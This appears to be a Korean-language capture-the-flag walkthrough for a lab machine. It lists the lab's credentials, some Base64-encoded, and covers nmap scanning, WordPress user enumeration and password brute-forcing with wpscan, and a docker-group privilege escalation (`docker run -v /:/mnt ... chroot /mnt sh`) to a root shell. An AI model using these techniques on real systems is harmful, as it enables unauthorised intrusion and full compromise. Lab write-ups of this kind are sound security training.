Wordpress
	firewall_admin - firework
	JY - archives
	JiH - articles
	JH - article
	MJ - archive
Linux
	root - firewallrootpassword
	JY - YXJjaGl2ZXM=
	JIH - YXJ0aWNsZXM=
	JH - YXJ0aWNsZQ==
	MJ - YXJjaGl2ZQ==
	linux_adnmin - 
		YWxpY2UJYWxpMTIxMg0KYm9iCXBhc3N3b3JkMTIzDQpjaGFybGllCXF3ZXJ0eTQ1Ng0KZGF2ZQlsZXRtZWluNzg5DQpKWQlhcmNoaXZlcw0KSmlICWFydGljbGVzDQpldmUJc2VjdXJlUGFzcyENCmZyYW5rCTEyMzQ1YWJjZGUNCmdyYWNlCWlsb3ZlQ3liZXJDaGVmDQpoZWlkaQloZWxsb1dvcmxkOTkNCkpICWFydGljbGUNCml2YW4Jc2VjcmV0X2tleQ0KanVkeQlzdXBlclN0cm9uZ1B3ZA0KTUoJYXJjaGl2ZQ==

# 1. 사전 탐색
`nmap victim IP` : 192.168.56.225(fixed), port 22/80/8080
`http://192.168.56.225/index.html` : html webpage
`http://192.168.56.225:8080` : wordpress -> wpscan 요구

# 2. wpscan
`wpscan --url http://192.168.1.225:8080 --enumerate u,p` : User ID 확인
	![[Pasted image 20241010085016.png]]

첫 번째 포스트 CTF : ignite page sorce 확인
	![[Pasted image 20241010093329.png]]
	![[Pasted image 20241010085314.png]]

`wpscan --url http://192.168.56.225:8080 -U users.txt -P /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt` : ID/PW 확인	
	![[Pasted image 20241010092018.png]]

# 3. MJ(Chef Worker) 계정 로그인
#### wordpress MJ 계정 로그인
	![[Pasted image 20241010092258.png]]
	![[Pasted image 20241010092402.png]]

#### Linux MJ 계정 로그인
ID:MJ / PW:YXJjaGl2ZQ== ("archive" to Base64)

`ls -al` : 숨겨진 List Passcode 파일 - w\[=o%Cvtr7wb ("firewalld" to Ascii85)
	![[Pasted image 20241010101627.png]]

`ls -l /home` : home 폴더, 모든 폴더는 others가 읽고 실행 가능
	![[Pasted image 20241010101651.png]]

`ls -al /home/linux_admin` : linux_admin home 폴더, 숨겨진 PASSWORD 파일 
`cat /home/linux_admin/.PASSWORD` : "Linux Admin PW is made with all user's ID and PW"
	![[Pasted image 20241010101728.png]]

#### Protected: ID/PW List on wordpress
wordpress protected post : "firewalld" 입력
	![[Pasted image 20241010095049.png]]
	![[Pasted image 20241010095132.png]]
	![[Pasted image 20241010095218.png]]

"Linux Admin PW is made with all user's ID and PW" : 모든 ID/PW 복사 -> CyberChef
	![[Pasted image 20241010095608.png]]


# 4. Linux_admin 계정 로그인
ID : linux_admin / PW : cyberchef 참고

`cat ignite_1_first_flag.txt` : linux_admin flag 확인
	![[Pasted image 20241010101832.png]]

# 5. Docker 취약점 확인 및 공격
`id linux_admin` : linux_admin ID 확인
	![[Pasted image 20241010101849.png]]

**Kali**
`docker pull alpine` : alpine docker image download
`docker save -o alpine_image.tar alpine` : alpine image 압축
`scp alpine_image.tar linux_admin@192.168.56.225:/home/linux_admin/` : ssh를 통해 alpine_image.tar 전송

**Linux_admin**
`docker load -i alpine_image.tar` : alpine image download
`docker images` : alpine images 확인
	![[Pasted image 20241010105715.png]]
`docker run -v /:/mnt -it alpine chroot /mnt sh` : docker image:alpine을 이용해 root 접속
	![[Pasted image 20241010105854.png]]

# 6. root 계정 / Flag
![[Pasted image 20241010105937.png]]
